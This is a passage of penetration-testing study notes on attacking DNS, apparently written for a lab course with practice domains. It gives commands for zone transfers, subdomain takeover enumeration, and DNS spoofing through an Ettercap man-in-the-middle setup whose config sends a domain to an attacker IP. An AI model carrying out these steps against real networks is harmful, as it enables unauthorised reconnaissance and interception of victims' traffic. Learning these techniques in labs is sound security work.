| **RDP Pass-the-Hash (PtH)** | Lateral Movement / GUI Access        | Possession of the target's NT hash.                | `xfreerdp`, `Registry Editor` | Restricted Admin Mode must be explicitly enabled on the target. |

***

***

## Attacking DNS

### 1. Initial DNS Enumeration

Before attacking DNS, you must verify the service is running and determine its version. DNS typically runs over **UDP port 53**, but falls back to **TCP port 53** when data packets are too large (such as during zone transfers).

#### The Command

Bash

```
nmap -p53 -Pn -sV -sC 10.10.110.213
```

* **`-p53`**: Targets only the DNS port.
* **`-sV`**: Determines the version of the software running (e.g., `ISC BIND 9.11.3`).
* **`-sC`**: Runs default Nmap scripts to check for standard configurations or known basic information.

### 2. DNS Zone Transfer (AXFR)

#### The Theory

A DNS zone file contains the master directory of every single record (IP address, mail server, subdomain) belonging to a specific domain. To prevent data loss, a primary DNS server copies its zone file to secondary backup servers using an **Asynchronous Full Transfer (AXFR)**.

The vulnerability occurs when an administrator fails to restrict who can request this transfer. If the server permits public AXFR requests, **anyone can download the entire internal map of the company's network without authentication**, instantly revealing hidden staging, development, or administrative infrastructure.

#### The Commands

**Option A: Using `dig` (Manual Verification)**

Bash

```
dig axfr @ns1.inlanefreight.htb inlanefreight.htb
```

* **`axfr`**: Specifies the query type as a full zone transfer request.
* **`@ns1.inlanefreight.htb`**: Outlines the specific authoritative name server you are querying.
* **`inlanefreight.htb`**: The target zone domain you want to dump.

**Option B: Using `fierce` (Automated Reconnaissance)**

Bash

```
fierce --domain zonetransfer.me
```

* **`fierce`**: Automatically discovers all name servers associated with the target domain and sequentially attempts an AXFR zone transfer against each one.

### 3. Subdomain Takeover & Enumeration

#### The Theory

Modern organizations rely heavily on third-party cloud architectures (like AWS S3 buckets, GitHub Pages, or Shopify) to host distinct components of their infrastructure. To make these look native, they point a custom subdomain to the cloud application using a **CNAME (Canonical Name)** record.

The flaw arises when the organization cancels its third-party service but **forgets to delete the CNAME record** from their DNS server. This results in a "dangling DNS record." Because the cloud pointer is completely empty, an attacker can sign up for a cheap account with that same cloud provider, claim the exact name of the abandoned asset, and seamlessly control everything hosted on that corporate subdomain.

#### The Commands

**Step 1: Passively Scrape Subdomains**

Bash

```
./subfinder -d inlanefreight.com -v
```

* **`subfinder`**: Scrapes public data sources, search engine indexes, and API feeds (like DNSdumpster) to find valid subdomains cleanly without touching the target.

**Step 2: Actively Brute-Force Subdomains (Internal Environments)**

Bash

```
./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

* **`subbrute`**: Ideal for offline or internal pentesting environments. It iteratively queries a custom list of names (`-s`) against an explicit local DNS resolver (`-r`) to see which subdomains map out successfully.

**Step 3: Check for CNAME Aliases**

Bash

```
host support.inlanefreight.com
```

* **`host`**: Resolves the domain to inspect its structural records. If the output returns an alias like `inlanefreight.s3.amazonaws.com` but navigating to the site throws a `NoSuchBucket` error, the subdomain is ripe for takeover.

### 4. Local DNS Spoofing (Cache Poisoning)

#### The Theory

DNS Spoofing involves feeding a machine false translation records so it maps a trusted website name to an illegitimate, attacker-controlled IP address instead.

On a local local area network (LAN), an attacker can achieve this by performing a **Man-in-the-Middle (MitM)** attack. By placing themselves between the target victim and the local gateway, the attacker intercepts DNS queries on the fly and returns fraudulent answers faster than the legitimate DNS server can respond.

#### The Commands & Setup (Using Ettercap)

**Step 1: Configure the Poisoning Rules**

Open the Ettercap configuration file and insert the spoofing mappings:

Bash

```
nano /etc/ettercap/etter.dns
```

Add the target entries pointing to your attacking machine's IP (e.g., `192.168.225.110`):

Plaintext

```
inlanefreight.com      A   192.168.225.110
*.inlanefreight.com    A   192.168.225.110
```

**Step 2: Run the Attack Strategy**

1. Fire up the Ettercap GUI or command line.
2. Select **Hosts > Scan for Hosts** to discover devices on your local network.
3. Assign the **Victim IP** as **Target 1**.
4. Assign the **Default Gateway (Router) IP** as **Target 2**.
5. Navigate to **Plugins > Manage Plugins** and double-click **`dns_spoof`** to activate.

When the victim tries to access `inlanefreight.com` or ping it, the resolution paths will automatically redirect straight to your malicious local host.

***

***
